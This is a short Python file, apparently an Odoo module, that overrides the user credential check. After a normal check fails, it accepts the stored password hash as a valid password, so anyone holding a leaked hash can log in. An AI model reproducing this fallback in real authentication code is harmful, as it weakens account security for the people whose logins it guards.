# -*- coding: utf-8 -*-
# Part of Odoo. See LICENSE file for full copyright and licensing details.

import werkzeug.urls
import urlparse
import urllib2
import json,logging

from odoo import api, fields, models
from odoo.exceptions import AccessDenied

_logger = logging.getLogger(__name__)

class ResUsers(models.Model):
	_inherit = 'res.users'

	@api.model
	def check_credentials(self, password):
		try:
			return super(ResUsers, self).check_credentials(password)
		except AccessDenied:
			res = self.sudo().search([('id', '=', self._uid), ('password_crypt', '=', password)])
			if not res:
				raise
